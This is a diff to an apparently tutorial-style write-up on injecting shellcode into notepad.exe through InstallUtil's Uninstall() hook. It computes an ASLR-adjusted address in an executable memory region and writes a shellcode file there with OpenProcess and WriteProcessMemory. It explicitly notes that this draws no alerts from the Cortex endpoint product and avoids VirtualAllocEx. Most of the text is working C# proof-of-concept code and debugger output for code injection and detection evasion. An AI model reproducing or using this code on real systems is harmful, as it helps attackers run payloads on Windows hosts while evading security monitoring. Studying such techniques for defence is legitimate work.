@@ -103,6 +103,7 @@ namespace IU
         // Uninstall() gets called by InstallUtil when /u is specified
         public override void Uninstall(IDictionary savedState)
         {
+            // Spawn notepad.exe
             Process p = new Process();
             p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
             p.StartInfo.CreateNoWindow = false;
@@ -211,15 +212,46 @@ From Wikipedia: "Address space layout randomization (ASLR) is a computer securit
 
 Basically, every time Windows is rebooted, ASLR randomizes the base addresses of stuff, so we need to deal with bases and offsets instead of absolute addresses. Knowing the offset of `0x800` from the end of the region is a good start; we just need to know the base address of the region.
 
-
-
-# PoC #2
-We'll update the `Uninstall()` function to import the required functions and then call them.
+Conveniently, C# allows us to retrieve the base address of the notepad.exe process:
 
 ```csharp
+    // Spawn notepad.exe
+    Process p = new Process();
+    p.StartInfo.FileName = "c:\\windows\\system32\\notepad.exe";
+    p.StartInfo.CreateNoWindow = false;
+    p.Start();
+
+    // Get the base address of notepad.exe.
+    IntPtr NotepadBase = p.MainModule.BaseAddress;
+```
+
+We just need to calculate the offset from the base address of notepad.exe to `0x800` bytes before the end of the RX region, so:
+
+```
+0:006> ? 7ff7`e7f46000 - 0x800 - notepad
+Evaluate expression: 153600 = 00000000`00025800
+```
+
+Now with the base and the offset, we can do:
+```csharp
+    IntPtr NotepadBase = p.MainModule.BaseAddress;
+    IntPtr WriteAddress = NotepadBase + 0x25800;
+```
+
+<hr/>
+
+# PoC #2
+Now that we can dynamically calculate the absolute address to write our shellcode, we'll update the `Uninstall()` function to import the required functions and then call them. We won't get greedy yet by trying to call `CreateRemoteThread()` - it's better to make small incremental changes.
+
+```csharp
+[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
+public static extern IntPtr OpenProcess(uint dwDesiredAccess, uint bInheritHandle, uint dwProcessId);
+[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out Int32 lpNumberOfBytesWritten);
+
 public override void Uninstall(IDictionary savedState)
 {
-    // Read in shellcode file from disk
+    // Read in msgbox shellcode from disk
     byte[] Shellcode = File.ReadAllBytes("c:\\temp\\msgbox.bin");
 
     // Spawn notepad.exe
@@ -228,22 +260,18 @@ public override void Uninstall(IDictionary savedState)
     p.StartInfo.CreateNoWindow = false;
     p.Start();
 
-    // Open a handle to the process, request permissions.
+    // Get the base address of notepad.exe and add the offset to the RX region
+    IntPtr NotepadBase = p.MainModule.BaseAddress;
+    IntPtr WriteAddress = NotepadBase + 0x25800;
+
+    // Open a handle to the process
     // (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) == 0x28
     IntPtr hProcess = OpenProcess(0x28, 0, (uint)p.Id);
 
     bool ret = false;
     int lpNumberOfBytesWritten = 0;
-
-    // Stage1: Address of ReplaceSel()
-    IntPtr ReplaceSel = NotepadBase + 0x157a8;
-    ret = WriteProcessMemory(hProcess, ReplaceSel, Stage1, Stage1.Length, out lpNumberOfBytesWritten);
-
-    // Stage2: Address of CheckSave()
-    IntPtr CheckSave = NotepadBase + 0x3690;
-    ret = WriteProcessMemory(hProcess, CheckSave, Stage2, Stage2.Length, out lpNumberOfBytesWritten);
-
-    // Spin here until notepad.exe exits
-    WaitForSingleObject(hProcess, 0xffffffff);
+    ret = WriteProcessMemory(hProcess, WriteAddress, Shellcode, Shellcode.Length, out lpNumberOfBytesWritten);
 }
 ```
+
+Now rebuild, upload iu.exe to target system, and `installutil /u iu.exe` to trigger `Uninstall()`, and we get no alerts from Cortex. It seems we can write our shellcode to the RX region inside notepad.exe. As a reminder, writing directly to memory already marked as executable saves us from having to allocate RX memory ourselves with `VirtualAllocEx()` which is risky.
